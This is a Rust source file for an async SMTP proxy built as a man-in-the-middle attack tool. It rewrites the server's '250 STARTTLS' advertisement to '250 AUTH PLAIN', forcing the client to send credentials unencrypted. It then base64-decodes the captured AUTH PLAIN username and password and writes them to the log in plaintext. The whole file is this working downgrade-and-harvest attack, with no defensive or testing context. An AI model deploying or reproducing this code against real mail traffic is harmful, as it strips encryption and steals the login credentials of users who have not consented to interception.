use log::{debug, error, info};

use anyhow::Context;
use anyhow::Result;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpStream;

const NEEDL_STARTTLS: &[u8] = b"250 STARTTLS\r\n";
const NEEDL_AUTH: &[u8] = b"AUTH PLAIN";

pub async fn proxy_to_remote(mut origin: TcpStream, remote: &str) -> Result<()> {
    let mut remote = TcpStream::connect(remote).await?;

    // TODO(timeout): tokio `TcpStream` don't have them, find a different way
    // remote.set_read_timeout(Some(Duration::from_secs(10)));
    // origin.set_read_timeout(Some(Duration::from_secs(10)))?;

    remote
        .set_nodelay(true)
        .context("failed to set nodelay to remote")?;
    origin
        .set_nodelay(true)
        .context("failed to set nodelay to origin")?;

    let (mut ri, mut wi) = origin.split();
    let (mut ro, mut wo) = remote.split();

    let local_to_remote = async {
        // tokio::io::copy(&mut ri, &mut wo).await?;
        proxy_reader_writer("Client->Remote:", &mut ri, &mut wo).await?;
        wo.shutdown().await
    };

    let remote_to_local = async {
        proxy_reader_writer("Remote->Client:", &mut ro, &mut wi).await?;
        wi.shutdown().await
    };

    tokio::try_join!(local_to_remote, remote_to_local)?;

    Ok(())
}

async fn proxy_reader_writer<'a, R: ?Sized, W: ?Sized>(
    direction: &str,
    reader: &'a mut R,
    writer: &'a mut W,
) -> std::io::Result<()>
where
    R: AsyncRead + Unpin,
    W: AsyncWrite + Unpin,
{
    let mut buf = Vec::new();

    loop {
        let mut b = [0; 1024];
        let lb = reader.read(&mut b).await?;
        if lb > 0 {
            buf.extend_from_slice(&b[0..lb]);
        }
        if lb > 0 && lb < 1024 {
            if buf.is_ascii() {
                if let Some(i) = twoway::find_bytes(&buf, NEEDL_STARTTLS) {
                    info(direction, &buf);
                    debug!("strip 'STARTTLS'");
                    // TODO(refactor) into a trait method like
                    //  `buf.ascii_replace("250 STARTTLS", "250 AUTH PLAIN")`

                    let mut buf_new = Vec::new();
                    buf_new.extend_from_slice(&buf[0..i]);
                    buf_new.extend_from_slice(b"250 ");
                    buf_new.extend_from_slice(NEEDL_AUTH);
                    buf_new.extend_from_slice(&buf[i + NEEDL_STARTTLS.len() - 2..]);
                    buf = buf_new;
                } else if buf.starts_with(NEEDL_AUTH) && buf.len() > NEEDL_AUTH.len() + 3 {
                    let credentials = &buf[NEEDL_AUTH.len() + 1..buf.len() - 2];
                    debug!(
                        "Credentials (base64): {}",
                        std::str::from_utf8(credentials).unwrap_or("<not-utf8-encoded>")
                    );
                    if let Ok(credentials) = base64::decode(credentials) {
                        if let Ok(credentials) = String::from_utf8(credentials) {
                            info!("Credentials (utf8): {}", credentials);
                        } else {
                            error!("Credentials are not utf8 decodable");
                        }
                    } else {
                        error!("Credentials are not base64 decodable");
                    }
                }
            }

            info(direction, &buf);
            writer.write(buf.as_slice()).await?;
            buf.clear();
        }

        if lb == 0 {
            debug!("{} EOF reached", direction);
            break;
        }
    }

    Ok(())
}

fn info(prefix: &str, buf: &[u8]) {
    if buf.is_ascii() {
        let lines = std::str::from_utf8(buf)
            .unwrap_or("<utf8-decoding-error>")
            .replace("\r", "<CR>")
            .replace("\n", "<LF>");

        info!("{} {}", prefix, lines);
    } else {
        info!("{} {:?}", prefix, buf);
    }
}
